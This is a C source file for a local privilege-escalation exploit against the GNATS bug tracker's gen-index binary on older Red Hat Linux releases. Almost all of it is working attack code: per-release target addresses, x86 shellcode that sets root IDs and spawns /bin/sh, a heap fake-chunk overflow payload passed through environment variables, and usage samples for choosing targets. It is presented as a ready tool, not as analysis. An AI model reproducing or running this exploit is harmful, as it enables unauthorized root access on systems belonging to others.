/*
**
** GNATS v3.113.x (The GNU bug-tracking system) local root 0day exploit
**
** Tested RedHat Linux 6.x,7.x (also, 8.x,9.x)
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.i21c.net & http://x82.inetcop.org
*/
/* -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** [?] Why is root setuid established in Linux?
**
** When install, user who is gnats must exist to system.
** If don't exist, setuid has been established by root's uid.
**
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#define VERSION "v0.0.2"
#define ATK_TG "/usr/local/libexec/gnats/gen-index"
typedef struct
{
	int os_t_nm;
	char *os_t;
	u_long got_dtors;
	u_long sh_code;
	u_long fk_chunk_addr;
	u_long fk_chunk_ptr;
	int off_st;
} l_sux_tg;
/*
**
** Structure: --
** fake chunk pointer -> &(fake chunk address) -> fake chunk header
** state_entry *next;    u_long fk_chunk_ptr;     u_long fk_chunk_addr;
*/
/*
// Format for the states file.
typedef struct state_entry {
	// State name.
	char *key;
	// State type.
	char *type;
	// Documentation string.
	char *description;
	// pointer to next record
	struct state_entry *next; // <- here.
} States;
States *s,*s_start=NULL,*s_end=NULL;
FILE *fp;
int ntypes=2;
static char *types[2];
int nstates=5;
static char *states[5];
static char *descst[5];
char line[255];
char **array=(char **)alloca(3*4);
char *path=(char *)alloca(4095);
4436 + 16;
*/
l_sux_tg os_tg[]=
{
	{
		0,"Red Hat Linux release 6.1 (Cartman) "
		": GNATS gen-index v3.113",
		0x08056fdc, /* fprintf GOT */
		0xbfffedee, /* shellcode */
		0x0805795c, /* fake chunk header */
		0x0805828c, /* &(fake chunk addr) ptr */
		-0x38
	},
	{
		1,"Red Hat Linux release 6.1 (Cartman) "
		": GNATS gen-index v3.113.1",
		0x0805711c, /* fprintf GOT */
		0xbfffedee, /* shellcode */
		0x08057a9c, /* fake chunk header */
		0x0805889c, /* &(fake chunk addr) ptr */
		-0x38
	},
	{
		2,"Red Hat Linux release 6.2 (Zoot) "
		": GNATS gen-index v3.113",
		0x08056fdc, /* fprintf GOT */
		0xbfffedee, /* shellcode */
		0x080577cc, /* fake chunk header */
		0x080581fc, /* &(fake chunk addr) ptr */
		-0x38
	},
	{
		3,"Red Hat Linux release 6.2 (Zoot) "
		": GNATS gen-index v3.113.1",
		0x0805711c, /* fprintf GOT */
		0xbfffedee, /* shellcode */
		0x0805790c, /* fake chunk header */
		0x0805836c, /* &(fake chunk addr) ptr */
		-0x38
	},
	{
		4,"Red Hat Linux release 7.0 (Guinness) "
		": GNATS gen-index v3.113",
		0x08056d1c, /* fprintf GOT */
		0xbfffedee, /* shellcode */
		0x0805750c, /* fake chunk header */
		0x08058504, /* &(fake chunk addr) ptr */
		0x0
	},
	{
		5,"Red Hat Linux release 7.0 (Guinness) "
		": GNATS gen-index v3.113.1",
		0x08056e3c, /* fprintf GOT */
		0xbfffedee, /* shellcode */
		0x0805762c, /* fake chunk header */
		0x08057f4c, /* &(fake chunk addr) ptr */
		0x0
	},
	{
		6,"Red Hat Linux release 7.3 (Valhalla) "
		": GNATS gen-index v3.113",
		0x08056794, /* fprintf GOT */
		0xbfffedee, /* shellcode */
		0x08056f2c, /* fake chunk header */
		0x08057fec, /* &(fake chunk addr) ptr */
		-0x20
	},
	{
		7,"Red Hat Linux release 7.3 (Valhalla) "
		": GNATS gen-index v3.113.1",
		0x08055e88, /* fprintf GOT */
		0xbfffedee, /* shellcode */
		0x0805662c, /* fake chunk header */
		0x08056f2c, /* &(fake chunk addr) ptr */
		-0x20
	},
	{
		8,(NULL),0x82828282,0x0,0x0,0x0,0
	}
};

char shellcode[]= /* NOP + setreuid + setregid + 23byte shellcode */
"\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40"
"\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40"
"\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40\x90\x40"
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80" /* setreuid(0,0); */
"\x31\xc0\xb0\x47\x31\xdb\x31\xc9\xcd\x80" /* setregid(0,0); */
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52"
"\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

void pre_usage(char *pre_f_nm);
int main(int argc,char *argv[])
{
	int g_g_bf=(0),km_jm,__verbs=(0);
	int tot_sh_sz=(sizeof(shellcode)+(100*4)+1);

	char env_sh[tot_sh_sz]; /* NOP + shellcode */
	char chunk_hd_garbage[6]={0x82,0x82,0x82,0x82};
	char fk_chunk_fst_hd[8]={0xf0,0xff,0xff,0xff};
	char fk_chunk_scd_hd[8]={0xfc,0xff,0xff,0xff};
	char p_rev_size[8]={0xfc,0xff,0xff,0xff};
	char __size_fd[8]={0xff,0xff,0xff,0xff};

#define DEF_C2PT_VAL (5000)
	u_char tot_atk_c2pt_bf[(DEF_C2PT_VAL)];
	u_char logr_chunk_hd_c2pt[0x32]= /* libc_free ptr_tg */
	{
#ifdef PR_CF
		0xf0,0xff,0xff,0xff, /* prev_size */
		0xfc,0xff,0xff,0xff, /* size_fd */
		0x0,0x0,0x0,0x0, /* fd ptr */
#endif
		0x0,0x0,0x0,0x0, /* bk ptr */
		0xfc,0xff,0xff,0xff, /* prev_size */
		0xff,0xff,0xff,0xff, /* size_fd */
		0x0,0x0,0x0,0x0, /* fd ptr */
		0x0,0x0,0x0,0x0 /* bk ptr */
	};
	char arg_set_lst_one_byte[0x14]= /* argument setting */
	{
		0x41,0x41,0x41,0x41,0x42,0x42,0x42,0x42, /* offset:8 */
		0x43,0x43,0x43,0x43,0x44,0x44,0x44,0x44, /* offset:8 */
		0x11 /* fake chunk header information */
	};
	char fk_nstates_nm[8]={0xf0,0xff,0xff,0xff}; /* bypass nstates: -1 */
	char nop_jmp_nop_concept[6]={0x42,0x0c,0xeb,0x41};
				//{0x90,0x0e,0xeb,0x40};
#define DEF_ZR (0)
	int os_atk_tp=(DEF_ZR);
	int sys_off_st=(os_tg[os_atk_tp].off_st);
	u_long got_dtors=(os_tg[os_atk_tp].got_dtors);
	u_long sh_code=(os_tg[os_atk_tp].sh_code);
	u_long fk_chunk_addr=(os_tg[os_atk_tp].fk_chunk_addr);
	u_long fk_chunk_ptr=(os_tg[os_atk_tp].fk_chunk_ptr);
	u_char *ctrl_ptr=(logr_chunk_hd_c2pt);

	fprintf(stdout,"\n GNATS v3.113.x (The GNU bug-tracking system) local root exploit.\n\n");
	while((km_jm=getopt(argc,argv,"T:t:O:o:R:r:S:s:F:f:P:p:VvHh"))!=EOF)
	{
		extern char *optarg;
		switch(km_jm)
		{
			case 'T':
			case 't':
				if((os_atk_tp=atoi(optarg))>(7))
				{
					(void)pre_usage(argv[0]);
				}
				else
				{
					sys_off_st=(os_tg[os_atk_tp].off_st);
					got_dtors=(os_tg[os_atk_tp].got_dtors);
					sh_code=(os_tg[os_atk_tp].sh_code);
					fk_chunk_addr=(os_tg[os_atk_tp].fk_chunk_addr);
					fk_chunk_ptr=(os_tg[os_atk_tp].fk_chunk_ptr);
				}
				break;

			case 'O':
			case 'o':
				sys_off_st=(atoi(optarg));
				break;

			case 'R':
			case 'r':
				got_dtors=(strtoul(optarg,0,0));
				break;

			case 'S':
			case 's':
				sh_code=(strtoul(optarg,0,0));
				break;

			case 'F':
			case 'f':
				fk_chunk_addr=(strtoul(optarg,0,0));
				break;

			case 'P':
			case 'p':
				fk_chunk_ptr=(strtoul(optarg,0,0));
				break;

			case 'V':
			case 'v':
				__verbs++;
				break;

			case 'H':
			case 'h':
				(void)pre_usage(argv[0]);
				break;

			case '?':
				(void)pre_usage(argv[0]);
				break;
		}
	}

	fprintf(stdout," [=] Offset: %d\n",sys_off_st);
	fprintf(stdout," [=] fprintf GOT address: %p\n",got_dtors);
	got_dtors-=(0x0c);
	fprintf(stdout," [=] shellcode address: %p\n",sh_code);
	fprintf(stdout," [=] fake chunk address: %p\n",fk_chunk_addr);
	fprintf(stdout," [=] fake chunk address ptr: %p\n",fk_chunk_ptr);

#ifdef PR_CF
	ctrl_ptr+=(strlen(fk_chunk_fst_hd)+strlen(fk_chunk_scd_hd));
	memcpy((char *)ctrl_ptr,chunk_hd_garbage,strlen(chunk_hd_garbage));
	ctrl_ptr+=(strlen(chunk_hd_garbage));
#endif
	fprintf(stdout," [0] Make fake chunk.\n");
	memcpy((char *)ctrl_ptr,chunk_hd_garbage,strlen(chunk_hd_garbage));
	ctrl_ptr+=(strlen(chunk_hd_garbage));

	ctrl_ptr+=(strlen(p_rev_size)+strlen(__size_fd));
	{
		*ctrl_ptr++=(got_dtors&0x000000ff)>>0;
		*ctrl_ptr++=(got_dtors&0x0000ff00)>>8;
		*ctrl_ptr++=(got_dtors&0x00ff0000)>>16;
		*ctrl_ptr++=(got_dtors&0xff000000)>>24;

		*ctrl_ptr++=(sh_code&0x000000ff)>>0;
		*ctrl_ptr++=(sh_code&0x0000ff00)>>8;
		*ctrl_ptr++=(sh_code&0x00ff0000)>>16;
		*ctrl_ptr++=(sh_code&0xff000000)>>24;
	}
	memset((char *)tot_atk_c2pt_bf,0,sizeof(tot_atk_c2pt_bf));
	ctrl_ptr=(tot_atk_c2pt_bf);

	for(g_g_bf=0;g_g_bf<(111);g_g_bf++,ctrl_ptr+=strlen(logr_chunk_hd_c2pt))
		memcpy((char *)ctrl_ptr,logr_chunk_hd_c2pt,strlen(logr_chunk_hd_c2pt));
	fprintf(stdout," [1] Set fake chunk address.\n");
	for(g_g_bf=0;g_g_bf<(555*4)+(sys_off_st);g_g_bf+=sizeof(fk_chunk_addr))
	{
		*ctrl_ptr++=(fk_chunk_addr&0x000000ff)>>0;
		*ctrl_ptr++=(fk_chunk_addr&0x0000ff00)>>8;
		*ctrl_ptr++=(fk_chunk_addr&0x00ff0000)>>16;
		*ctrl_ptr++=(fk_chunk_addr&0xff000000)>>24;
	}
	fprintf(stdout," [2] Make 16byte magic code.\n");
	{
		memcpy((char *)ctrl_ptr,fk_nstates_nm,strlen(fk_nstates_nm));
		ctrl_ptr+=(strlen(fk_nstates_nm));
		memcpy((char *)ctrl_ptr,chunk_hd_garbage,strlen(chunk_hd_garbage));
		ctrl_ptr+=(strlen(chunk_hd_garbage));
		memcpy((char *)ctrl_ptr,chunk_hd_garbage,strlen(chunk_hd_garbage));
		ctrl_ptr+=(strlen(chunk_hd_garbage));

		*ctrl_ptr++=(fk_chunk_ptr&0x000000ff)>>0;
		*ctrl_ptr++=(fk_chunk_ptr&0x0000ff00)>>8;
		*ctrl_ptr++=(fk_chunk_ptr&0x00ff0000)>>16;
		*ctrl_ptr++=(fk_chunk_ptr&0xff000000)>>24;
	}
	if(__verbs)
	{
		int t_nm_pls;
		int atk_lsz;
		atk_lsz=(strlen(arg_set_lst_one_byte));
		fprintf(stdout,"\n [*] Total argument len: %d\n",atk_lsz);
		for(t_nm_pls=(0);t_nm_pls<atk_lsz;t_nm_pls+=4)
		{
			fprintf(stdout," [0x%08x] ",*(long *)&arg_set_lst_one_byte[t_nm_pls]);
			if((t_nm_pls!=(0))&&((t_nm_pls%16)==(0)))
				fprintf(stdout,"\n");
		}
		atk_lsz=(strlen(tot_atk_c2pt_bf));
		fprintf(stdout,"\n [*] Total atkcode len: %d\n",atk_lsz);
		for(t_nm_pls=(0);t_nm_pls<atk_lsz;t_nm_pls+=4)
		{
			fprintf(stdout," [0x%08x] ",*(long *)&tot_atk_c2pt_bf[t_nm_pls]);
			if((t_nm_pls!=(0))&&((t_nm_pls%16)==(0)))
				fprintf(stdout,"\n");
		}
		fprintf(stdout,"\n\n Sample structure:\n\n");
		fprintf(stdout," 0x41414141 0x42424242 0x43434343 0x44444444 // offset:17 (`-c' argument)\n");
		fprintf(stdout," 0x00000011 0x00001181 0x82828282 0xfffffffc 0xffffffff // fake chunk header (environment)\n");
		fprintf(stdout,"            [     first chunk   ] [    second chunk   ]\n");
		fprintf(stdout," 0xXXXXXXXX 0xYYYYYYYY 0xPPPPPPPP 0xPPPPPPPP 0xPPPPPPPP ... // (environment)\n");
		fprintf(stdout," [ GOTors ] [  shell ] [       &(fake chunk addr) ...     ]\n");
		fprintf(stdout," 0xfffffff0 0x82828282 0x82828282 0xFKFKFKFK // (environment)\n");
		fprintf(stdout," [nstates ] [      offset:8     ] [ chunk ptr ]\n\n");
	}
	fprintf(stdout," [3] Make shellcode.\n");
	{
		memset((char *)env_sh,0,sizeof(env_sh));
		ctrl_ptr=(env_sh);
		for(g_g_bf=0;g_g_bf<100;g_g_bf++,ctrl_ptr+=strlen(nop_jmp_nop_concept))
			memcpy((char *)ctrl_ptr,nop_jmp_nop_concept,strlen(nop_jmp_nop_concept));
		strncat(env_sh,shellcode,sizeof(env_sh)-strlen(env_sh));
	}

	fprintf(stdout," [4] Set environment attack code.\n");
	/* environment setting */
	setenv("X82",env_sh,strlen(env_sh));
	setenv("GNATS_ROOT",tot_atk_c2pt_bf,strlen(tot_atk_c2pt_bf));

	fprintf(stdout," [5] Try exploit ...\n\n");
	execl((ATK_TG),(ATK_TG),"-c",(arg_set_lst_one_byte),0);
}

void pre_usage(char *pre_f_nm)
{
	int r_num=(0);
	fprintf(stdout," Usage: %s -option [argument]\n\n",pre_f_nm);
	fprintf(stdout,"\t-o [offset num]  : offset number.\n");
	fprintf(stdout,"\t-r [retloc addr] : retloc GOT address.\n");
	fprintf(stdout,"\t-s [shell addr]  : shellcode address.\n");
	fprintf(stdout,"\t-f [chunk addr]  : fake chunk address.\n");
	fprintf(stdout,"\t-p [chunk ptr]   : fake chunk address ptr.\n");
	fprintf(stdout,"\t-v               : verbose mode.\n");
	fprintf(stdout,"\t-h               : help information.\n");
	fprintf(stdout,"\t-t [target num]  : select target number.\n\n");
	fprintf(stdout," Select target number:\n\n");
	while(1)
	{
		if((os_tg[r_num].os_t)==(NULL))
			break;
		else
		{	
			fprintf(stdout,"\t{%d} : %s\n",os_tg[r_num].os_t_nm,os_tg[r_num].os_t);
			r_num++;
		}
	}
	fprintf(stdout,"\n Sample #1): %s -t0\n",pre_f_nm);
	fprintf(stdout," Sample #2): %s -o0 -r0x82828282 -s0x8282bab0 -v\n\n",pre_f_nm);
	exit(0);
}

/* eoc */



